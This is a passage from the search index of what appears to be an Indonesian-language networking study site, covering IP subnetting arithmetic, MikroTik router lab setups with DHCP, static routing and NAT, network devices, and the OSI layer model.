Wildcard"},{"location":"jarkom/ip_s_w/#ip-address-netmask-network-broadcast","text":"IP Address : 127.0.0.1 Netmask : 255.0.0.0 /8 ----------------------------- AND Network : 127.0.0.0 Broadcast : 127.255.255.255 IP Address : 202.145.23.1 Netmask : 255.255.255.0 /24 ----------------------------- AND Network : 202.145.23.0 Broadcast : 202.145.23.255 IP Address : 202.145.200.1 11001010 . 10010001 . 11001000 . 00000001 Netmask : 255.255.224.0 /19 11111111 . 11111111 . 11100000 . 00000000 ----------------------------- AND Network : 202.145.192.0 11001010 . 10010001 . 11000000 . 00000000 Broadcast : 202.145.223.255 11001010 . 10010001 . 11011111 . 11111111","title":"IP Address, Netmask, Network, Broadcast"},{"location":"jarkom/ip_s_w/#subnet","text":"Alasan dibuat subnet adalah untuk memecah network, misalkan saja sebuah network 10.0.0.0, jumlah host yang dapat ditampung sejumlah 10.0.0.0 = 00001010 . 00000000 . 00000000 . 00000000 H = (2 h ) - 2 H = (2 24 ) - 2 H = 16.777.214 Tidak masuk akal sebuah kabel jaringan menampung 16 juta host , maka diatasi dengan subnet https://en.wikipedia.org/wiki/Subnetwork misal network 192.168.1.0 ingin dipecah menjadi subnet, sekarang kita akan meminjam beberapa bit host (misal 2 bit, boleh lebih) 192.168.1.0 = 11000000 . 10101000 . 00000001 . 00 000000 setelah dipinjam akan menjadi 192.168.1.0 = 11000000 . 10101000 . 00000001 . 00 000000 192.168.1.64 = 11000000 . 10101000 . 00000001 . 01 000000 192.168.1.128 = 11000000 . 10101000 . 00000001 . 10 000000 192.168.1.192 = 11000000 . 10101000 . 00000001 . 11 000000 diperoleh 4 subnet degan meminjam 2 bit host untuk broadcast akan menjadi 192.168.1.63 = 11000000 . 10101000 . 00000001 . 00 111111 192.168.1.127 = 11000000 . 10101000 . 00000001 . 01 111111 192.168.1.191 = 11000000 . 10101000 . 00000001 . 10 111111 192.168.1.255 = 11000000 . 10101000 . 00000001 . 11 111111 dan untuk netmask hanya mengubah semua bit network dengan 1 255.255.255.192 = 11111111 . 11111111 . 11111111 . 11 000000 nilai netmask sama untuk tiap subnet","title":"Subnet"},{"location":"jarkom/ldap/","text":"","title":"LDAP"},{"location":"jarkom/mikrotik/","text":"Mikrotik \u00b6 beberapa materi ada di old wetofu Lab 1 \u00b6 Tujuan \u00b6 Static Routing Router 1 (Mikrotik7.3.1-1) DHCP Client IP Address NAT Masquerade Port Forwarding Router 2 (Mikrotik7.3.1-2) IP Address IP Route IP DNS DHCP Server NAT Masquerade Konfigurasi Router \u00b6 Konfigurasi R1 \u00b6 cek IP dhcp-client [admin@R1] > ip dhcp-client print Columns: INTERFACE, USE-PEER-DNS, ADD-DEFAULT-ROUTE, STATUS, ADDRESS # INTERFACE USE-PEER-DNS ADD-DEFAULT-ROUTE STATUS ADDRESS 0 ether1 yes yes bound 192.168.122.182/24 kita akan mencoba konfigurasi dari awal [admin@R1] > ip dhcp-client remove 0 [admin@R1] > ip dhcp-client print [admin@R1] > ip dhcp-client add interface=ether1 disable=no [admin@R1] > ip dhcp-client print Columns: INTERFACE, USE-PEER-DNS, ADD-DEFAULT-ROUTE, STATUS, ADDRESS # INTERFACE USE-PEER-DNS ADD-DEFAULT-ROUTE STATUS ADDRESS 0 ether1 yes yes bound 192.168.122.182/24 [admin@R1] > ping google.com SEQ HOST SIZE TTL TIME STATUS 0 74.125.130.100 56 99 48ms936us 1 74.125.130.100 56 99 70ms536us ... tambah IP Address tiap ethernet [admin@R1] > ip address add address=10.10.11.1/30 interface=ether2 [admin@R1] > ip address add address=192.168.10.1/28 interface=ether3 [admin@R1] > ip address print Flags: D - DYNAMIC Columns: ADDRESS, NETWORK, INTERFACE # ADDRESS NETWORK INTERFACE 0 D 192.168.122.182/24 192.168.122.0 ether1 1 10.10.11.1/30 10.10.11.0 ether2 2 192.168.10.1/28 192.168.10.0 ether3 menambahkan masquerade dalam mikrotik, masquerade dilakukan agar IP Private dapat terhubung ke internet [admin@R1] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade Konfigurasi R2 \u00b6 buat ip pada ethernet [admin@MikroTik] > ip address add address=10.10.11.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.11.1/27 interface=ether2 [admin@MikroTik] > ip address print Columns: ADDRESS, NETWORK, INTERFACE # ADDRESS NETWORK INTERFACE 0 10.10.11.2/30 10.10.11.0 ether1 1 192.168.11.1/27 192.168.11.0 ether2 tambah ip route [admin@MikroTik] > ip route add gateway=10.10.11.1 [admin@MikroTik] > ip route print Flags: D - DYNAMIC; A - ACTIVE; c, s, y - COPY Columns: DST-ADDRESS, GATEWAY, DISTANCE # DST-ADDRESS GATEWAY DISTANCE 0 As 0.0.0.0/0 10.10.11.1 1 DAc 10.10.11.0/30 ether1 0 DAc 192.168.11.0/27 ether2 0 set dns [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > ping 10.10.11.1 SEQ HOST SIZE TTL TIME STATUS 0 10.10.11.1 56 64 3ms881us 1 10.10.11.1 56 64 1ms246us 2 10.10.11.1 56 64 1ms147us sent=3 received=3 packet-loss=0% min-rtt=1ms147us avg-rtt=2ms91us max-rtt=3ms881us [admin@MikroTik] > ping google.com SEQ HOST SIZE TTL TIME STATUS 0 142.251.12.102 56 102 48ms581us 1 142.251.12.102 56 102 56ms366us 2 142.251.12.102 56 102 56ms191us sent=3 received=3 packet-loss=0% min-rtt=48ms581us avg-rtt=53ms712us max-rtt=56ms366us [admin@MikroTik] > set dhcp-server [admin@MikroTik] > ip dhcp-server print [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 192.168.11.0/27 Select gateway for given network gateway for dhcp network: 192.168.11.1 Select pool of ip addresses given out by DHCP server addresses to give out: 192.168.11.2-192.168.11.30 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m [admin@MikroTik] > set nat masquerade [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade Konfigurasi PC \u00b6 Konfigurasi PC1 \u00b6 penulisan ip <ip_address> <netmask> <gateway> PC1> ip 192.168.10.2 255.255.255.240 192.168.10.1 Checking for duplicate address... PC1 : 192.168.10.2 255.255.255.240 gateway 192.168.10.1 PC1> show ip NAME : PC1[1] IP/MASK : 192.168.10.2/28 GATEWAY : 192.168.10.1 DNS : MAC : 00:50:79:66:68:00 LPORT : 10032 RHOST:PORT : 127.0.0.1:10033 MTU : 1500 PC1> ping 192.168.10.1 84 bytes from 192.168.10.1 icmp_seq=1 ttl=64 time=0.821 ms 84 bytes from 192.168.10.1 icmp_seq=2 ttl=64 time=1.011 ms ^C tambah dns, dalam praktikum lab ini akan menggunakan ip NAT1 dapat dicek melalui mikrotik [admin@R1] > ip dns print servers: dynamic-servers: 192.168.122.1 use-doh-server: verify-doh-cert: no allow-remote-requests: no max-udp-packet-size: 4096 query-server-timeout: 2s query-total-timeout: 10s max-concurrent-queries: 100 max-concurrent-tcp-sessions: 20 cache-size: 2048KiB cache-max-ttl: 1w cache-used: 26KiB PC1> ip dns 192.168.122.1 PC1> ping facebook.com facebook.com resolved to 157.240.208.35 84 bytes from 157.240.208.35 icmp_seq=1 ttl=44 time=49.252 ms 84 bytes from 157.240.208.35 icmp_seq=2 ttl=44 time=56.983 ms ^C PC1> ping detik.com detik.com resolved to 103.49.221.211 84 bytes from 103.49.221.211 icmp_seq=1 ttl=51 time=31.022 ms 84 bytes from 103.49.221.211 icmp_seq=2 ttl=51 time=39.996 ms ^C Konfigurasi PC2 PC3 PC4 \u00b6 PC4> ip dhcp DORA IP 192.168.11.30/27 GW 192.168.11.1 PC4> show ip NAME : PC4[1] IP/MASK : 192.168.11.30/27 GATEWAY : 192.168.11.1 DNS : 192.168.122.1 DHCP SERVER : 192.168.11.1 DHCP LEASE : 590, 600/300/525 MAC : 00:50:79:66:68:03 LPORT : 10050 RHOST:PORT : 127.0.0.1:10051 MTU : 1500 PC4> Winbox \u00b6 dalam hal ini router1 dapat terkoneksi dengan winbox dikarenakan IP Router (ether1) terletak pada satu network dengan NAT1 sedangkan agar bisa terhubung ke router2 perlu dikonfigurasi routing yang menuju router2 prosesnya dilakukan melalui router1, dengan dst-address adalah IP router1 (ether1), dst-port 8292 (port forwarding untuk mikrotik), to-addresses 10.10.11.2 (ip router2), to-ports 8291 (port forwarding untuk mikrotik) [admin@R1] > ip firewall nat print Flags: X - disabled, I - invalid; D - dynamic 0 chain=srcnat action=masquerade out-interface=ether1 [admin@R1] > [admin@R1] > [admin@R1] > ip firewall nat add chain=dstnat dst-address=192.168.122.182 protocol=tcp dst-port=8292 action=dst-nat to-addresses=10.10.11.2 to-ports=8291 [admin@R1] > [admin@R1] > [admin@R1] > ip firewall nat print Flags: X - disabled, I - invalid; D - dynamic 0 chain=srcnat action=masquerade out-interface=ether1 1 chain=dstnat action=dst-nat to-addresses=10.10.11.2 to-ports=8291 protocol=tcp dst-address=192.168.11.1 dst-port=8292 login winbox dengan connect to 192.168.122.182:8292 Lab 2 \u00b6 Tujuan \u00b6 Static Routing Setiap PC dapat terhubung ke internet dan PC lain Konfigurasi Router \u00b6 Router 1 \u00b6 disini Router 1 telah mendapat IP DHCP, jika belum silahkan konfigurasi seperti pada LAB 1 [admin@MikroTik] > ip address add address=192.168.10.1/30 interface=ether2 [admin@MikroTik] > ip address add address=192.168.14.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.10.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=192.168.11.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=172.20.11.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=172.20.12.0/30 gateway=192.168.14.2 [admin@MikroTik] > ip route add dst-address=192.168.15.0/30 gateway=192.168.14.2 [admin@MikroTik] > ip route add dst-address=172.20.13.0/29 gateway=192.168.14.2 Router 2 \u00b6 [admin@MikroTik] > ip address add address=192.168.10.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.11.1/30 interface=ether2 [admin@MikroTik] > ip address add address=172.20.10.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.10.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.11.0/30 gateway=192.168.11.2 Router 3 \u00b6 [admin@MikroTik] > ip address add address=192.168.14.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.15.1/30 interface=ether2 [admin@MikroTik] > ip address add address=172.20.12.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.14.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.13.0/29 gateway=192.168.15.2 Router 4 \u00b6 [admin@MikroTik] > ip address add address=192.168.11.2/30 interface=ether1 [admin@MikroTik] > ip address add address=172.20.11.1/30 interface=ether2 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.11.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 172.20.11.0/30 Select gateway for given network gateway for dhcp network: 172.20.11.1 Select pool of ip addresses given out by DHCP server addresses to give out: 172.20.13.2 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m Router 5 \u00b6 [admin@MikroTik] > ip address add address=192.168.15.2/30 interface=ether1 [admin@MikroTik] > ip address add address=172.20.13.1/30 interface=ether2 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.15.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 172.20.13.0/30 Select gateway for given network gateway for dhcp network: 172.20.13.1 Select pool of ip addresses given out by DHCP server addresses to give out: 172.20.13.2-172.20.13.6 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m Konfigurasi PC \u00b6 Konfigurasi menggunakan cara yang sama seperti LAB 1","title":"Mikrotik"},{"location":"jarkom/mikrotik/#mikrotik","text":"beberapa materi ada di old wetofu","title":"Mikrotik"},{"location":"jarkom/mikrotik/#lab-1","text":"","title":"Lab 1"},{"location":"jarkom/mikrotik/#tujuan","text":"Static Routing Router 1 (Mikrotik7.3.1-1) DHCP Client IP Address NAT Masquerade Port Forwarding Router 2 (Mikrotik7.3.1-2) IP Address IP Route IP DNS DHCP Server NAT Masquerade","title":"Tujuan"},{"location":"jarkom/mikrotik/#konfigurasi-router","text":"","title":"Konfigurasi Router"},{"location":"jarkom/mikrotik/#konfigurasi-r1","text":"cek IP dhcp-client [admin@R1] > ip dhcp-client print Columns: INTERFACE, USE-PEER-DNS, ADD-DEFAULT-ROUTE, STATUS, ADDRESS # INTERFACE USE-PEER-DNS ADD-DEFAULT-ROUTE STATUS ADDRESS 0 ether1 yes yes bound 192.168.122.182/24 kita akan mencoba konfigurasi dari awal [admin@R1] > ip dhcp-client remove 0 [admin@R1] > ip dhcp-client print [admin@R1] > ip dhcp-client add interface=ether1 disable=no [admin@R1] > ip dhcp-client print Columns: INTERFACE, USE-PEER-DNS, ADD-DEFAULT-ROUTE, STATUS, ADDRESS # INTERFACE USE-PEER-DNS ADD-DEFAULT-ROUTE STATUS ADDRESS 0 ether1 yes yes bound 192.168.122.182/24 [admin@R1] > ping google.com SEQ HOST SIZE TTL TIME STATUS 0 74.125.130.100 56 99 48ms936us 1 74.125.130.100 56 99 70ms536us ... tambah IP Address tiap ethernet [admin@R1] > ip address add address=10.10.11.1/30 interface=ether2 [admin@R1] > ip address add address=192.168.10.1/28 interface=ether3 [admin@R1] > ip address print Flags: D - DYNAMIC Columns: ADDRESS, NETWORK, INTERFACE # ADDRESS NETWORK INTERFACE 0 D 192.168.122.182/24 192.168.122.0 ether1 1 10.10.11.1/30 10.10.11.0 ether2 2 192.168.10.1/28 192.168.10.0 ether3 menambahkan masquerade dalam mikrotik, masquerade dilakukan agar IP Private dapat terhubung ke internet [admin@R1] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade","title":"Konfigurasi R1"},{"location":"jarkom/mikrotik/#konfigurasi-r2","text":"buat ip pada ethernet [admin@MikroTik] > ip address add address=10.10.11.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.11.1/27 interface=ether2 [admin@MikroTik] > ip address print Columns: ADDRESS, NETWORK, INTERFACE # ADDRESS NETWORK INTERFACE 0 10.10.11.2/30 10.10.11.0 ether1 1 192.168.11.1/27 192.168.11.0 ether2 tambah ip route [admin@MikroTik] > ip route add gateway=10.10.11.1 [admin@MikroTik] > ip route print Flags: D - DYNAMIC; A - ACTIVE; c, s, y - COPY Columns: DST-ADDRESS, GATEWAY, DISTANCE # DST-ADDRESS GATEWAY DISTANCE 0 As 0.0.0.0/0 10.10.11.1 1 DAc 10.10.11.0/30 ether1 0 DAc 192.168.11.0/27 ether2 0 set dns [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > ping 10.10.11.1 SEQ HOST SIZE TTL TIME STATUS 0 10.10.11.1 56 64 3ms881us 1 10.10.11.1 56 64 1ms246us 2 10.10.11.1 56 64 1ms147us sent=3 received=3 packet-loss=0% min-rtt=1ms147us avg-rtt=2ms91us max-rtt=3ms881us [admin@MikroTik] > ping google.com SEQ HOST SIZE TTL TIME STATUS 0 142.251.12.102 56 102 48ms581us 1 142.251.12.102 56 102 56ms366us 2 142.251.12.102 56 102 56ms191us sent=3 received=3 packet-loss=0% min-rtt=48ms581us avg-rtt=53ms712us max-rtt=56ms366us [admin@MikroTik] > set dhcp-server [admin@MikroTik] > ip dhcp-server print [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 192.168.11.0/27 Select gateway for given network gateway for dhcp network: 192.168.11.1 Select pool of ip addresses given out by DHCP server addresses to give out: 192.168.11.2-192.168.11.30 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m [admin@MikroTik] > set nat masquerade [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade","title":"Konfigurasi R2"},{"location":"jarkom/mikrotik/#konfigurasi-pc","text":"","title":"Konfigurasi PC"},{"location":"jarkom/mikrotik/#konfigurasi-pc1","text":"penulisan ip <ip_address> <netmask> <gateway> PC1> ip 192.168.10.2 255.255.255.240 192.168.10.1 Checking for duplicate address... PC1 : 192.168.10.2 255.255.255.240 gateway 192.168.10.1 PC1> show ip NAME : PC1[1] IP/MASK : 192.168.10.2/28 GATEWAY : 192.168.10.1 DNS : MAC : 00:50:79:66:68:00 LPORT : 10032 RHOST:PORT : 127.0.0.1:10033 MTU : 1500 PC1> ping 192.168.10.1 84 bytes from 192.168.10.1 icmp_seq=1 ttl=64 time=0.821 ms 84 bytes from 192.168.10.1 icmp_seq=2 ttl=64 time=1.011 ms ^C tambah dns, dalam praktikum lab ini akan menggunakan ip NAT1 dapat dicek melalui mikrotik [admin@R1] > ip dns print servers: dynamic-servers: 192.168.122.1 use-doh-server: verify-doh-cert: no allow-remote-requests: no max-udp-packet-size: 4096 query-server-timeout: 2s query-total-timeout: 10s max-concurrent-queries: 100 max-concurrent-tcp-sessions: 20 cache-size: 2048KiB cache-max-ttl: 1w cache-used: 26KiB PC1> ip dns 192.168.122.1 PC1> ping facebook.com facebook.com resolved to 157.240.208.35 84 bytes from 157.240.208.35 icmp_seq=1 ttl=44 time=49.252 ms 84 bytes from 157.240.208.35 icmp_seq=2 ttl=44 time=56.983 ms ^C PC1> ping detik.com detik.com resolved to 103.49.221.211 84 bytes from 103.49.221.211 icmp_seq=1 ttl=51 time=31.022 ms 84 bytes from 103.49.221.211 icmp_seq=2 ttl=51 time=39.996 ms ^C","title":"Konfigurasi PC1"},{"location":"jarkom/mikrotik/#konfigurasi-pc2-pc3-pc4","text":"PC4> ip dhcp DORA IP 192.168.11.30/27 GW 192.168.11.1 PC4> show ip NAME : PC4[1] IP/MASK : 192.168.11.30/27 GATEWAY : 192.168.11.1 DNS : 192.168.122.1 DHCP SERVER : 192.168.11.1 DHCP LEASE : 590, 600/300/525 MAC : 00:50:79:66:68:03 LPORT : 10050 RHOST:PORT : 127.0.0.1:10051 MTU : 1500 PC4>","title":"Konfigurasi PC2 PC3 PC4"},{"location":"jarkom/mikrotik/#winbox","text":"dalam hal ini router1 dapat terkoneksi dengan winbox dikarenakan IP Router (ether1) terletak pada satu network dengan NAT1 sedangkan agar bisa terhubung ke router2 perlu dikonfigurasi routing yang menuju router2 prosesnya dilakukan melalui router1, dengan dst-address adalah IP router1 (ether1), dst-port 8292 (port forwarding untuk mikrotik), to-addresses 10.10.11.2 (ip router2), to-ports 8291 (port forwarding untuk mikrotik) [admin@R1] > ip firewall nat print Flags: X - disabled, I - invalid; D - dynamic 0 chain=srcnat action=masquerade out-interface=ether1 [admin@R1] > [admin@R1] > [admin@R1] > ip firewall nat add chain=dstnat dst-address=192.168.122.182 protocol=tcp dst-port=8292 action=dst-nat to-addresses=10.10.11.2 to-ports=8291 [admin@R1] > [admin@R1] > [admin@R1] > ip firewall nat print Flags: X - disabled, I - invalid; D - dynamic 0 chain=srcnat action=masquerade out-interface=ether1 1 chain=dstnat action=dst-nat to-addresses=10.10.11.2 to-ports=8291 protocol=tcp dst-address=192.168.11.1 dst-port=8292 login winbox dengan connect to 192.168.122.182:8292","title":"Winbox"},{"location":"jarkom/mikrotik/#lab-2","text":"","title":"Lab 2"},{"location":"jarkom/mikrotik/#tujuan_1","text":"Static Routing Setiap PC dapat terhubung ke internet dan PC lain","title":"Tujuan"},{"location":"jarkom/mikrotik/#konfigurasi-router_1","text":"","title":"Konfigurasi Router"},{"location":"jarkom/mikrotik/#router-1","text":"disini Router 1 telah mendapat IP DHCP, jika belum silahkan konfigurasi seperti pada LAB 1 [admin@MikroTik] > ip address add address=192.168.10.1/30 interface=ether2 [admin@MikroTik] > ip address add address=192.168.14.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.10.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=192.168.11.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=172.20.11.0/30 gateway=192.168.10.2 [admin@MikroTik] > ip route add dst-address=172.20.12.0/30 gateway=192.168.14.2 [admin@MikroTik] > ip route add dst-address=192.168.15.0/30 gateway=192.168.14.2 [admin@MikroTik] > ip route add dst-address=172.20.13.0/29 gateway=192.168.14.2","title":"Router 1"},{"location":"jarkom/mikrotik/#router-2","text":"[admin@MikroTik] > ip address add address=192.168.10.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.11.1/30 interface=ether2 [admin@MikroTik] > ip address add address=172.20.10.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.10.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.11.0/30 gateway=192.168.11.2","title":"Router 2"},{"location":"jarkom/mikrotik/#router-3","text":"[admin@MikroTik] > ip address add address=192.168.14.2/30 interface=ether1 [admin@MikroTik] > ip address add address=192.168.15.1/30 interface=ether2 [admin@MikroTik] > ip address add address=172.20.12.1/30 interface=ether3 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.14.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip route add dst-address=172.20.13.0/29 gateway=192.168.15.2","title":"Router 3"},{"location":"jarkom/mikrotik/#router-4","text":"[admin@MikroTik] > ip address add address=192.168.11.2/30 interface=ether1 [admin@MikroTik] > ip address add address=172.20.11.1/30 interface=ether2 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.11.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 172.20.11.0/30 Select gateway for given network gateway for dhcp network: 172.20.11.1 Select pool of ip addresses given out by DHCP server addresses to give out: 172.20.13.2 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m","title":"Router 4"},{"location":"jarkom/mikrotik/#router-5","text":"[admin@MikroTik] > ip address add address=192.168.15.2/30 interface=ether1 [admin@MikroTik] > ip address add address=172.20.13.1/30 interface=ether2 [admin@MikroTik] > [admin@MikroTik] > ip dns set servers=192.168.122.1 [admin@MikroTik] > [admin@MikroTik] > ip route add gateway=192.168.15.1 [admin@MikroTik] > [admin@MikroTik] > ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade [admin@MikroTik] > [admin@MikroTik] > ip dhcp-server setup Select interface to run DHCP server on dhcp server interface: ether2 Select network for DHCP addresses dhcp address space: 172.20.13.0/30 Select gateway for given network gateway for dhcp network: 172.20.13.1 Select pool of ip addresses given out by DHCP server addresses to give out: 172.20.13.2-172.20.13.6 Select DNS servers dns servers: 192.168.122.1 Select lease time lease time: 10m","title":"Router 5"},{"location":"jarkom/mikrotik/#konfigurasi-pc_1","text":"Konfigurasi menggunakan cara yang sama seperti LAB 1","title":"Konfigurasi PC"},{"location":"jarkom/mssql/","text":"","title":"MSSQL"},{"location":"jarkom/net_tools/","text":"Perangkat Network dan OSI Terakhir update : 26 Maret 2022 Router Router bekerja pada layer 3 (model OSI) / Network layer . Router yang telah dikembangkan sampai layer 4 memiliki fungsi tambahan sebagai firewall Bridge Bridge bekerja pada layer 2 (model OSI) / Data Link layer . Biasanya digunakan untuk menghubungkan network yang menggunakan topologi sejenis Switch Switch bekerja pada layer 2 (model OSI) / Data Link layer . Berfungsi sebagai sentral / konsentrator. Dapat dianggap multiport bridge . Dikembangkan MLS ( multilayer switch ) yang beroperasi layer 2 hingga 7 Hub Bekerja pada layer 1 (model OSI). Jarang digunakan karena \" banjir broadcast \" Repeater Bekerja pada layer 1 (model OSI). digunakan untuk \"memperkuat\" sinyal agar informasi dapat sampai ke host yang lokasinya jauh Referensi \u00b6 Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"NET Tools"},{"location":"jarkom/net_tools/#referensi","text":"Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"Referensi"},{"location":"jarkom/netbios/","text":"","title":"NetBIOS"},{"location":"jarkom/netsec/","text":"Network Security \u00b6","title":"Network Security"},{"location":"jarkom/netsec/#network-security","text":"","title":"Network Security"},{"location":"jarkom/ntp/","text":"","title":"NTP"},{"location":"jarkom/osi_layer/","text":"Open Systems Interconnection (OSI) Layer Terakhir update : 26 Maret 2022 Deskripsi Umum \u00b6 OSI membagi fungsi network menjadi 7 lapisan. Model OSI menjadi acuan bagi siapa saja yang ingin memahami cara kerja jaringan komputer. Dan tidak ada paksaan untuk menggunakan model OSI, seperti contoh model DARPA ( Defence Advanced Research Projects Agency ). 1 Physical 2 Data Link 3 Network 4 Transport 5 Session 6 Presentation 7 Application Keuntungan OSI Model dibuat berlapis-lapis \u00b6 Memudahkan memahami cara kerja jaringan komputer Memecah persoalan komunikasi data menjadi bagian kecil, memudahkan proses troubleshooting Memudahkan mendesain dan mengembangkan jaringan sesuai dengan fungsi layer Menyediakan standar interface bagi pengembang Tabel Fungsi OSI \u00b6 Layer Fungsi Contoh Protokol Application Menyediakan servis bagi berbagai aplikasi network Telnet, FTP, DHCP, HTTP Presentation Mengatur konversi dan translasi format data, seperti kompresi data dan enkripsi data ASCII, ASCII7, MIDI, MPEG, TDI Session Mengatur sesi yang meliputi establishing , maintaining , dan terminating antar entitas yang dimiliki oleh presentation layer SQL, X Window, NetBIOS, ASP, SCP, ZIP, Named Pipes (DNS) Transport Menyediakan end-to-end communication protocol . Bertanggung jawab atas \"keselamatan data\" dan \"segmentasi data\", seperti mengatur flow control , error detection dan correction , data sequencing , dan size of the packet TCP, UDP, SPX, SCTP, IPX Network Menentukan rute yang dilalui oleh data. Menyediakan logical addressing dan path determination IP, ICMP, IPsec, ARP, RIP, BGP, OSPF, NBF, IPX Data Link Menentukan pengalamatan fisik, deteksi error, frame flow control , dan topologi network. 2 Sublayer: Logical Link Control (LLC), Media Access Control (MAC). LLC mengatur error notification dan flow control . MAC mengatur pengalamatan fisik guna komunikasi antar adapter 802.3 (Ethernet), 802.11a/b/g/n MAC/LLC, 802.1Q (VLAN), ATM, HDP, PPP, Token Ring , Fibre Channel , Frame Relay Physical Berkaitan dengan kelistrikan/gelombang/medan, tegangan/arus listrik, jenis kabel/konektor, pergantian fasa, mengalirkan bit-bit antar device 802.11a/b/g/n PHY, DSL, hub , repeater , fibre optics , RS-232, V.35, V.34, I.430, I.431, POTS, SONET Komunikasi Antar Layer \u00b6 komunikasi dapat berlangsung secara vertikal maupun horizontal Aliran Informasi Layer \u00b6 frame trailer digunakan sebagai kendali kecepatan transfer atau flow control, frame trailer juga disebut FCS (frame check sequence) Referensi \u00b6 Sofana, Iwan. (2017). Cisco CCNA-CCNP ROUTING DAN SWITCHING . Bandung. Penerbit INFORMATIKA \u21a9","title":"OSI Layer"},{"location":"jarkom/osi_layer/#deskripsi-umum","text":"OSI membagi fungsi network menjadi 7 lapisan. Model OSI menjadi acuan bagi siapa saja yang ingin memahami cara kerja jaringan komputer. Dan tidak ada paksaan untuk menggunakan model OSI, seperti contoh model DARPA ( Defence Advanced Research Projects Agency ). 1 Physical 2 Data Link 3 Network 4 Transport 5 Session 6 Presentation 7 Application","title":"Deskripsi Umum"},{"location":"jarkom/osi_layer/#keuntungan-osi-model-dibuat-berlapis-lapis","text":"Memudahkan memahami cara kerja jaringan komputer Memecah persoalan komunikasi data menjadi bagian kecil, memudahkan proses troubleshooting Memudahkan mendesain dan mengembangkan jaringan sesuai dengan fungsi layer Menyediakan standar interface bagi pengembang","title":"Keuntungan OSI Model dibuat berlapis-lapis"},{"location":"jarkom/osi_layer/#tabel-fungsi-osi","text":"Layer Fungsi Contoh Protokol Application Menyediakan servis bagi berbagai aplikasi network Telnet, FTP, DHCP, HTTP Presentation Mengatur konversi dan translasi format data, seperti kompresi data dan enkripsi data ASCII, ASCII7, MIDI, MPEG, TDI Session Mengatur sesi yang meliputi establishing , maintaining , dan terminating antar entitas yang dimiliki oleh presentation layer SQL, X Window, NetBIOS, ASP, SCP, ZIP, Named Pipes (DNS) 